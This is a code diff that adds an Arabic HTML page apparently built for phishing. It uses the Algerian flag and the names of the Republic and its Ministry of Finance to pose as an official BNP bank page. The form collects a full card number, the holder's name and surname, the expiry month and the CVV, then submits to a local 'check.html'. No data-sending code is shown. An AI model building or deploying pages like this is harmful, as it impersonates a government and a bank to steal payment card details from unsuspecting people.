@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>bnp بنك</title>
+    <link rel="stylesheet" href="../ar_css/bnp.css" />
+    <link rel="icon" href="../imgs/algerie.png" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+  </head>
+  <body>
+    <header>
+      <div class="logo">
+        <img src="../imgs/algerie.png" alt="algerian flag" />
+      </div>
+
+      <div class="gov">
+        <p>الجمهورية الجزائرية الديمقراطية الشعبية</p>
+        <p>وزارة المالية</p>
+      </div>
+
+      <div class="lang"></div>
+    </header>
+    <section>
+      <div class="form">
+        <div class="img">
+          <img src="../imgs/bnp.png" alt="bnp" />
+        </div>
+        <form action="../ar_html/check.html">
+          <input
+            min="1000000000000000"
+            max="9999999999999999"
+            type="number"
+            placeholder="رقم البطاقة"
+            required
+            class="cardNum"
+            name="number"
+            autofocus
+          />
+          <br />
+          <input type="text" placeholder="الإسم" required class="name" />
+          <input type="text" placeholder="اللقب" required class="fname" />
+          <br />
+          <input
+            type="month"
+            required
+            class="date"
+            min="2022-04"
+            max="2026-04"
+            value="2024-04"
+          />
+          <input
+            type="number"
+            placeholder="cvv"
+            required
+            class="cvv"
+            name="number"
+            min="100"
+            max="999"
+          />
+          <button type="submit" value=" إتمام العملية" class="done">
+            إتمام العملية
+          </button>
+        </form>
+      </div>
+    </section>
+  </body>
+</html>
